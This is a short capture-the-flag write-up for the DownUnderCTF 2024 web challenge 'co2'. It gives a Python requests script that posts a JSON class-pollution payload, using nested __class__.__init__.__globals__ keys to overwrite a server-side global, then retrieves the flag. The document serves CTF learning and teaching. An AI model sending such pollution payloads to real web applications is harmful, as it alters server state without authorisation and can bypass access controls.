# co2
Solved by **aan**

## Question
A group of students who don't like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You've been hired to perform an in-depth whitebox test on their web application.

## Solution
```
import requests

url = 'https://web-co2-e5579efdaa23dfd5.2024.ductf.dev/save_feedback'
headers = {
    'Host': 'web-co2-e5579efdaa23dfd5.2024.ductf.dev',
    'Content-Type': 'application/json'
}
cookies = {
    'session': '.eJwlzjsOwjAMANC7ZGawm9hOepnK8UewpnRC3B0QB3jSe5UjV5z3sj_XFbdyPLzsRbWJu-KsksBsnbsBJJJoRhURmghE2IDMu7eRdSNWYkerUxx4cApwuM0cOkaiBbUfGiJOlrwZBGk09FnNW2UXhDra7DqxfCPXGeu_wfL-AMKJL2c.ZogjbQ.2MS_haKTYdV6WBL5grb7WdWl1NI'
}
data = {
    "title": "test",
    "content": "test",
    "rating": "",
    "referred": "etst",
    "__class__": {
        "__init__": {
            "__globals__": {
                "flag": "true"
            }
        }
    }
}

response = requests.post(url, headers=headers, cookies=cookies, json=data)

print(response.status_code)
print(response.text)

getflag_url = 'https://web-co2-e5579efdaa23dfd5.2024.ductf.dev/get_flag'
getflag_response = requests.get(getflag_url, headers=headers, cookies=cookies)

print(getflag_response.text)
```

Reference:
- https://blog.abdulrah33m.com/prototype-pollution-in-python/

### Flag
`DUCTF{_cl455_p0lluti0n_ftw_}}`
